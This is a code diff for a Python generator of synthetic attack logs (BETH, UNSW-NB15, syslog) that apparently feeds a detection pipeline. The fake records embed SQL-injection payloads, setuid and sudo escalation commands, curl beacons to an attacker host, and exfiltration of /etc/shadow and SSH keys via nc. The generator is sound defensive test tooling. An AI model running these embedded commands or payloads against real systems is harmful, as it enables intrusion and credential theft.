+            "Dpkts": random.randint(1, 4),
+            "state": random.choice(["RST", "FIN"]),
+            "ct_src_dport_ltm": random.randint(10, 500),
+            "attack_cat": "Fuzzers",
+            "Label": 1,
+        }
+        logs.append(_make_log(
+            source="UNSW-NB15",
+            severity="HIGH",
+            message=(
+                f"Brute-force/fuzzer from {attacker} → {target}:{raw['dsport']}"
+                f" attempts={raw['ct_src_dport_ltm']}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+# ===========================================================================
+# BETH (Linux kernel audit logs)
+# ===========================================================================
+
+def beth_privilege_escalation(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """BETH — sudo / SUID abuse privilege escalation events."""
+    syscalls = ["execve", "setuid", "setgid", "capset", "ptrace"]
+    commands = ["sudo su", "chmod u+s /bin/bash", "pkexec bash", "su root", "newgrp root"]
+    logs = []
+    for i in range(n):
+        raw = {
+            "timestamp": _ts(i * 3),
+            "host": target,
+            "user": f"user{random.randint(1000, 9999)}",
+            "pid": random.randint(1000, 60000),
+            "ppid": random.randint(1, 1000),
+            "syscall": syscalls[i % len(syscalls)],
+            "comm": commands[i % len(commands)],
+            "exe": f"/usr/bin/{syscalls[i % len(syscalls)]}",
+            "auid": random.randint(1000, 9999),
+            "success": random.choice([True, False]),
+            "evil": True,
+            "sus": True,
+        }
+        logs.append(_make_log(
+            source="BETH",
+            severity="CRITICAL",
+            message=(
+                f"Privilege escalation on {target}: "
+                f"user={raw['user']} cmd={raw['comm']!r} "
+                f"syscall={raw['syscall']}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def beth_lateral_movement(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """BETH — SSH / rsync lateral movement across hosts."""
+    tools = ["ssh", "scp", "rsync", "nc", "socat"]
+    logs = []
+    for i in range(n):
+        raw = {
+            "timestamp": _ts(i * 15),
+            "host": target,
+            "user": f"svc{random.randint(10, 99)}",
+            "pid": random.randint(1000, 60000),
+            "ppid": random.randint(1, 1000),
+            "syscall": "execve",
+            "comm": tools[i % len(tools)],
+            "exe": f"/usr/bin/{tools[i % len(tools)]}",
+            "argv": f"{tools[i % len(tools)]} {attacker}",
+            "auid": random.randint(1000, 9999),
+            "success": True,
+            "evil": True,
+            "sus": True,
+        }
+        logs.append(_make_log(
+            source="BETH",
+            severity="HIGH",
+            message=(
+                f"Lateral movement from {attacker} via {tools[i % len(tools)]}"
+                f" on host {target}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def beth_c2(attacker: str, target: str, n: int = 6) -> list[dict]:
+    """BETH — C2 beacon via curl/wget/python calling back home."""
+    agents = ["curl", "wget", "python3", "bash", "perl"]
+    logs = []
+    for i in range(n):
+        raw = {
+            "timestamp": _ts(i * 60),
+            "host": target,
+            "user": "root",
+            "pid": random.randint(1000, 60000),
+            "ppid": random.randint(1, 1000),
+            "syscall": "connect",
+            "comm": agents[i % len(agents)],
+            "exe": f"/usr/bin/{agents[i % len(agents)]}",
+            "argv": f"{agents[i % len(agents)]} http://{attacker}/beacon",
+            "remote_addr": attacker,
+            "remote_port": random.choice([80, 443, 4444, 8080]),
+            "evil": True,
+            "sus": True,
+        }
+        logs.append(_make_log(
+            source="BETH",
+            severity="CRITICAL",
+            message=(
+                f"C2 beacon from {target} → {attacker}:{raw['remote_port']}"
+                f" via {agents[i % len(agents)]}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+# ===========================================================================
+# SYSLOG (RFC-3164 / RFC-5424 style)
+# ===========================================================================
+
+def _syslog_line(facility: int, severity_code: int, host: str,
+                 program: str, pid: int, msg: str,
+                 ts: str | None = None) -> str:
+    """Assemble a minimal syslog line."""
+    pri = facility * 8 + severity_code
+    ts = ts or datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")
+    return f"<{pri}>{ts} {host} {program}[{pid}]: {msg}"
+
+
+def syslog_brute_force(attacker: str, target: str, n: int = 8) -> list[dict]:
+    """sshd failed-password lines — classic brute-force pattern."""
+    logs = []
+    users = ["root", "admin", "ubuntu", "pi", "oracle", "postgres"]
+    for i in range(n):
+        user = users[i % len(users)]
+        port = _rand_port(exclude_well_known=True)
+        pid = random.randint(10000, 59999)
+        msg = (
+            f"Failed password for {'invalid user ' if i % 3 == 0 else ''}"
+            f"{user} from {attacker} port {port} ssh2"
         )
-        print(f"✅ Connected to Kafka at {args.broker}")
-    except NoBrokersAvailable:
-        print(f"❌ Could not connect to Kafka at {args.broker}. Is it running?")
-        return
-
-    interval = 1.0 / args.rate
-    count = 0
-    dataset_cycle = list(DATASETS.keys())
-    cycle_idx = 0
-
-    print(f"🚨 Publishing attack logs → '{args.topic}' | dataset={args.dataset} | rate={args.rate}/sec\n")
-
-    try:
-        while True:
-            # pick dataset
-            if args.dataset == "all":
-                ds_name = dataset_cycle[cycle_idx % len(dataset_cycle)]
-                cycle_idx += 1
-            else:
-                ds_name = args.dataset
-
-            scenarios = DATASETS[ds_name]
-
-            # pick scenario
-            if args.scenario == "random" or args.scenario not in scenarios:
-                fn = random.choice(list(scenarios.values()))
-            else:
-                fn = scenarios[args.scenario]
-
-            attacker = rand_ip()
-            target   = rand_internal_ip()
-            logs     = fn(attacker, target)
-            label    = fn.__name__.replace("_", " ").upper()
-
-            print(f"\n{'─'*65}")
-            print(f"  🔴 [{ds_name.upper()}] {label}")
-            print(f"  Attacker: {attacker}  →  Target: {target}")
-            print(f"{'─'*65}")
-
-            for log in logs:
-                producer.send(args.topic, value=log)
-                count += 1
-                sev = log["severity"].upper()
-                print(f"  [{count:>4}] [{sev:>8}] {log['message']}")
-                time.sleep(interval)
-
-    except KeyboardInterrupt:
-        print(f"\n⛔ Stopped. {count} logs published.")
-    finally:
-        producer.flush()
-        producer.close()
+        raw = _syslog_line(4, 6, target, "sshd", pid, msg)
+        logs.append(_make_log(
+            source="SYSLOG/sshd",
+            severity="HIGH",
+            message=f"SSH brute-force: {attacker} → {target} user={user}",
+            raw=raw,
+        ))
+    return logs
 
 
-if __name__ == "__main__":
-    main()
+def syslog_sql_injection(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """Apache/nginx access-log lines containing SQLi payloads."""
+    payloads = [
+        "/index.php?id=1' OR '1'='1",
+        "/login?user=admin'--&pass=x",
+        "/search?q=' UNION SELECT 1,2,3--",
+        "/api/user?id=1;DROP TABLE users--",
+        "/wp-login.php?redirect_to=' AND SLEEP(5)--",
+    ]
+    logs = []
+    for i in range(n):
+        pid = random.randint(10000, 59999)
+        code = random.choice([200, 400, 403, 500])
+        payload = payloads[i % len(payloads)]
+        msg = (
+            f'{attacker} - - [{_ts()}] '
+            f'"GET {payload} HTTP/1.1" {code} {random.randint(200, 5000)} '
+            f'"-" "sqlmap/1.7"'
+        )
+        raw = _syslog_line(1, 5, target, "apache2", pid, msg)
+        logs.append(_make_log(
+            source="SYSLOG/apache2",
+            severity="HIGH",
+            message=f"SQL-injection in HTTP request from {attacker}: {payload}",
+            raw=raw,
+        ))
+    return logs
+
+
+def syslog_port_scan(attacker: str, target: str, n: int = 9) -> list[dict]:
+    """iptables DROP entries for a rapid port scan."""
+    logs = []
+    for i in range(n):
+        dst_port = random.randint(1, 1024)
+        pid = random.randint(1000, 9999)
+        msg = (
+            f"[UFW BLOCK] IN=eth0 OUT= SRC={attacker} DST={target} "
+            f"PROTO=TCP SPT={_rand_port(True)} DPT={dst_port} SYN"
+        )
+        raw = _syslog_line(4, 4, target, "kernel", pid, msg)
+        logs.append(_make_log(
+            source="SYSLOG/kernel",
+            severity="MEDIUM",
+            message=f"Port scan blocked: {attacker} → {target}:{dst_port}",
+            raw=raw,
+        ))
+    return logs
+
+
+def syslog_ransomware(attacker: str, target: str, n: int = 6) -> list[dict]:
+    """auditd lines showing mass file renames (.locked extension)."""
+    exts = [".locked", ".encrypted", ".enc", ".crypt", ".crypto"]
+    paths = ["/home/user/Documents", "/var/www/html", "/opt/app/data",
+             "/srv/files", "/mnt/share", "/home/user/Desktop"]
+    logs = []
+    for i in range(n):
+        pid = random.randint(10000, 59999)
+        ext = exts[i % len(exts)]
+        path = paths[i % len(paths)]
+        fname = f"file{random.randint(100, 999)}.dat"
+        msg = (
+            f"type=SYSCALL arch=x86_64 syscall=rename pid={pid} "
+            f"success=yes exe=/tmp/.x a0={path}/{fname} "
+            f"a1={path}/{fname}{ext}"
+        )
+        raw = _syslog_line(4, 2, target, "auditd", pid, msg)
+        logs.append(_make_log(
+            source="SYSLOG/auditd",
+            severity="CRITICAL",
+            message=(
+                f"Ransomware file encryption on {target}: "
+                f"{path}/{fname} → {fname}{ext}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def syslog_c2(attacker: str, target: str, n: int = 6) -> list[dict]:
+    """Cron-scheduled curl beacons — classic C2 persistence."""
+    intervals = [60, 120, 300, 600]
+    logs = []
+    for i in range(n):
+        interval = intervals[i % len(intervals)]
+        pid = random.randint(10000, 59999)
+        port = random.choice([80, 443, 8080, 4444])
+        msg = (
+            f"CMD (curl -s http://{attacker}:{port}/check?id="
+            f"{random.randint(1000,9999)} > /dev/null 2>&1)"
+        )
+        raw = _syslog_line(9, 6, target, "CRON", pid, msg)
+        logs.append(_make_log(
+            source="SYSLOG/cron",
+            severity="CRITICAL",
+            message=(
+                f"C2 beacon scheduled: {target} → {attacker}:{port} "
+                f"every {interval}s"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def syslog_privilege_escalation(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """sudo and su abuse lines."""
+    cmds = [
+        "sudo /bin/bash",
+        "sudo chmod 777 /etc/shadow",
+        "sudo -u root /tmp/payload",
+        "su -c 'bash -i' root",
+        "sudo visudo",
+    ]
+    logs = []
+    for i in range(n):
+        pid = random.randint(10000, 59999)
+        user = f"user{random.randint(1000, 9999)}"
+        cmd = cmds[i % len(cmds)]
+        msg = f"{user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND={cmd}"
+        raw = _syslog_line(4, 5, target, "sudo", pid, msg)
+        logs.append(_make_log(
+            source="SYSLOG/sudo",
+            severity="CRITICAL",
+            message=(
+                f"Privilege escalation on {target}: user={user} cmd={cmd!r}"
+            ),
+            raw=raw,
+        ))
+    return logs
+
+
+def syslog_data_exfiltration(attacker: str, target: str, n: int = 5) -> list[dict]:
+    """Large outbound transfers flagged by iptables / DLP daemon."""
+    methods = ["scp", "rsync", "curl", "nc", "python3 -c 'socket'"]
+    paths = ["/etc/passwd", "/etc/shadow", "/var/lib/postgresql/data",
+             "/home/user/.ssh/id_rsa", "/opt/app/config.env"]
+    logs = []
+    for i in range(n):
+        pid = random.randint(10000, 59999)
+        method = methods[i % len(methods)]
+        fpath = paths[i % len(paths)]
+        size_mb = round(random.uniform(10, 500), 1)
+        msg = (
+            f"OUTBOUND {method} from {target} to {attacker} "
+            f"file={fpath} size={size_mb}MB FLAGGED"
+        )
+        raw = _syslog_line(4, 2, target, "dlp-agent", pid, msg)
+        logs.append(_make_log(
+            source="SYSLOG/dlp-agent",
+            severity="CRITICAL",
+            message=(
+                f"Data exfiltration: {fpath} ({size_mb} MB) → {attacker}"
+                f" via {method}"
+            ),
+            raw=raw,
+        ))
+    return logs
